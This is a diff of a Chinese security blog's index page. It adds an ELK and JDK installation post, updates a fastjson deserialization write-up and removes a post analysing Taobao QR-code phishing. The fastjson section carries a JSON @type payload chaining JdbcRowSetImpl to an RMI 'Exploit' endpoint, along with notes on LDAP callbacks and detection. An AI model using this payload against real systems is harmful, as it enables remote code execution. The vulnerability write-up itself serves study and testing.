@@ -292,6 +292,171 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/13/ELK安装使用相关记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/13/ELK安装使用相关记录/" itemprop="url">ELK安装使用相关记录</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-13T02:21:30+08:00">
+                2019-08-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/大数据/" itemprop="url" rel="index">
+                    <span itemprop="name">大数据</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-ELK大概介绍"><a href="#0x00-ELK大概介绍" class="headerlink" title="0x00 ELK大概介绍"></a>0x00 ELK大概介绍</h2><p>ELK就是elastic search+logstash+kibana，然后logstash通常还要配上beats，简单的逻辑是：beats -> logstash->elastic search ->kibana</p>
+<ol>
+<li>beats是轻量型的数据采集装置，采集好数据后发送给logstash</li>
+<li>logstash就像是一个日志搜集管道，里面带了一些日志格式的过滤插件，最后整合成统一格式的数据发送给elasticsearch</li>
+<li>elasticsearch拿到数据后存起来就可以开始根据配置进行搜索了，提供了restful的接口</li>
+<li>kibana作为开源通用的界面帮助我们快速的利用elasticsearch进行搜索</li>
+</ol>
+<h2 id="0x01-ELK安装"><a href="#0x01-ELK安装" class="headerlink" title="0x01 ELK安装"></a>0x01 ELK安装</h2><p>Ubuntu为例，现在官方提供了一系列的安装方式，可以直接参照官方文档进行安装即可。这里使用的是apt的安装方式：</p>
+<ol>
+<li>sudo apt-get install apt-transport-https</li>
+<li>echo “deb <a href="https://artifacts.elastic.co/packages/7.x/apt" target="_blank" rel="noopener">https://artifacts.elastic.co/packages/7.x/apt</a> stable main” | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list</li>
+<li>sudo apt-get update &amp;&amp; sudo apt-get install elasticsearch logstash kibana</li>
+<li>beats的话要根据实际采集的数据格式去下载，比如mysql的话去下载mysqlbeats</li>
+</ol>
+<h2 id="0x02-java环境"><a href="#0x02-java环境" class="headerlink" title="0x02 java环境"></a>0x02 java环境</h2><p>ELK依赖于Java环境，官方说最好建议使用oracle jdk8，oracle现在下载jdk需要登陆注册，因此直接手工去下载包解压缩后手工配置。</p>
+<ol>
+<li>创建java的目录：<code>mkdir /usr/lib/jvm</code></li>
+<li>下载并解压tar包：<code>sudo tar -zxvf /home/Downloads/jdk-8u221-linux-x64.tar.gz -C /usr/lib/jvm</code></li>
+<li>为了便于java版本管理，这里使用Linux包版本管理工具update-alternatives其本质是软连接的管理，因此我们直接将javahome做软连接</li>
+<li><code>sudo update-alternatives —install /usr/local/jdk jdk /usr/lib/jvm/jdk-8u22XXXXXX 300</code></li>
+<li>然后将该软连接的jdk目录写入到环境变量中作为javahome： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#set oracle jdk environment</span><br><span class="line">export JAVA_HOME=/usr/local/jdk  ## 这里要注意目录要换成自己解压的jdk 目录</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>以后如果需要切换jdk版本，先通过install的方式注册jdk，然后通过命令：<br><code>update-alternatives —config jdk</code><br>来进行切换，install的时候后面的数字是优先级，在auto模式的时候有用默认根据数字大的优先作为版本使用</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/xstream-1.4.10反序列化漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -531,7 +696,7 @@
         
           
             <h2 id="0x00-关于fastjson"><a href="#0x00-关于fastjson" class="headerlink" title="0x00 关于fastjson"></a>0x00 关于fastjson</h2><p>反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。<br>关于开关fastjson的autotype以及白名单配置<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/enable_autotype</a></p>
-<h2 id="0x01-关于反序列化"><a href="#0x01-关于反序列化" class="headerlink" title="0x01 关于反序列化"></a>0x01 关于反序列化</h2><p>之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype设置的问题，以至于不管你是否开启autotype，使用@type都可以触发反序列化，目前的修复方案好像也只是优化了黑名单，并没有从本质上解决这个问题。<br>目前出问题的是java.lang.Class可以构造出其他的反序列化利用链，而因为种种问题参考<a href="https://bithack.io/forum/393" target="_blank" rel="noopener">fastjson漏洞分析</a>可以绕过黑名单和checkautotype的校验。</p>
+<h2 id="0x01-关于反序列化"><a href="#0x01-关于反序列化" class="headerlink" title="0x01 关于反序列化"></a>0x01 关于反序列化</h2><p>之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype设置的问题，以至于不管你是否开启autotype，使用@type都可以触发反序列化，目前的修复方案好像也只是优化了黑名单，并没有从本质上解决这个问题。<br>目前出问题的是java.lang.Class可以构造出其他的反序列化利用链，而因为种种问题参考<a href="https://bithack.io/forum/393" target="_blank" rel="noopener">fastjson漏洞分析</a>，<a href="http://xz.aliyun.com/t/5680" target="_blank" rel="noopener">http://xz.aliyun.com/t/5680</a>可以绕过黑名单和autotypesuport的校验。</p>
 <h2 id="0x02-payload"><a href="#0x02-payload" class="headerlink" title="0x02 payload"></a>0x02 payload</h2><p><code>{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}}}</code><br>本次利用的形式如上，后面的利用链可以更换成以前的其他类似的payload均可以，因此有很多种变种。<br>将下面这个github里的历史payload改造成上面这种就好了<a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" title="github历史payload" target="_blank" rel="noopener">github历史payload</a></p>
 <h2 id="0x03-一些利用"><a href="#0x03-一些利用" class="headerlink" title="0x03 一些利用"></a>0x03 一些利用</h2><p>利用的思路可以看看这个文章<a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">fastjson利用总结</a>，思路是差不多的，具体payload参考上面那个github改一改，这文章里有个直接执行命令的利用方法可以关注一下（意思是不需要搭建rmi和ldap的那种）<br>新增：</p>
 <ol>
@@ -541,6 +706,7 @@
 <li>利用的时候ldap能收到目标发送的请求但是没有通过reference请求到web服务获取exploit.class的原因就是前面说的jdk版本问题</li>
 <li>ldap收到了请求就可以认为目标存在fastjson漏洞，至于能不能饶过版本限制就是后面的事情了，可以根据这个特性做个批量检测工具</li>
 <li>关于版本饶过的详细总结可以看这个<a href="https://www.freebuf.com/column/207439.html" target="_blank" rel="noopener">饶过jdk版本限制</a></li>
+<li>貌似在未开启autotypesuport配置情况下，需要发两次请求触发缓存</li>
 </ol>
 <h2 id="0x05关于测试环境"><a href="#0x05关于测试环境" class="headerlink" title="0x05关于测试环境"></a>0x05关于测试环境</h2><p>测试环境可以使用vulhub的fastjson环境，该环境目前已知有两个问题：</p>
 <ol>
@@ -1696,156 +1862,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/29/关于淘宝二维码钓鱼问题的一些想法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/29/关于淘宝二维码钓鱼问题的一些想法/" itemprop="url">关于淘宝二维码问题的一些想法</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-29T17:36:45+08:00">
-                2019-03-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/案例记录与反思/" itemprop="url" rel="index">
-                    <span itemprop="name">案例记录与反思</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>今天fb上发了一篇关于淘宝二维码钓鱼的文章，不过该文章估计也快被公关了，暂时甩个还能访问的链接<a href="http://www.sohu.com/a/304529557_354899" title="淘宝二维码钓鱼问题" target="_blank" rel="noopener">淘宝二维码钓鱼问题原文</a></p>
-<h2 id="大致描述"><a href="#大致描述" class="headerlink" title="大致描述"></a>大致描述</h2><p>总结下来大概的意思就是如何利用淘口令结合网页扫码登录来进行钓鱼。<br>流程为：使用后端服务自动提取登录二维码的链接->转换成淘口令->散布淘口令->用户复制淘口令后进入淘宝APP->淘宝APP内部转换淘口令后跳转登录授权->用户受骗点击登录->后端服务获取到用户的授权即可登录淘宝。</p>
-<h2 id="问题反思"><a href="#问题反思" class="headerlink" title="问题反思"></a>问题反思</h2><p>一开始看的时候很容易让人以为出问题的是二维码扫描登录，其实并不完全是，因为这本身是一个钓鱼的场景，无论我们如何优化二维码扫描登录也无法避免被用来钓鱼。而让这个场景变得更容易被钓鱼的本身原因应该有下面那么几个：</p>
-<ol>
-<li>淘口令生成时候对链接校验不足，本质上还是一个短链接生成服务，虽然有对域名进行校验但是使用URL跳转漏洞可以绕过，那么对于淘口令生成的方面需要加强业务场景的校验，非业务场景的链接应该不予生成。</li>
-<li>淘口令在淘宝APP里打开时候没有做严格的场景限定，应该在APP内限制淘口令仅能用来唤起相应的商品或者店铺，而不是跳转到授权登录页。</li>
-<li>扫码登录的链接应该只能通过淘宝APP扫码来实现，非该操作都不能通过APP内部逻辑来唤醒，本质上还是对于场景的校验不足。</li>
-</ol>
-<p>我个人认为应该按照这么个逻辑来修复这个问题，本质上还是对于钓鱼的场景进行限制即可。没有必要修改二维码扫码登录的协议，最多就是看看还有没有什么加固的空间。<br>当然换句话说，除了淘口令可能被利用以外，如果没有在APP内对于链接唤醒协议的场景做限制，可能还有其他类似的功能也可以被用来做钓鱼。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1898,7 +1914,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1909,7 +1925,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -1920,7 +1936,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
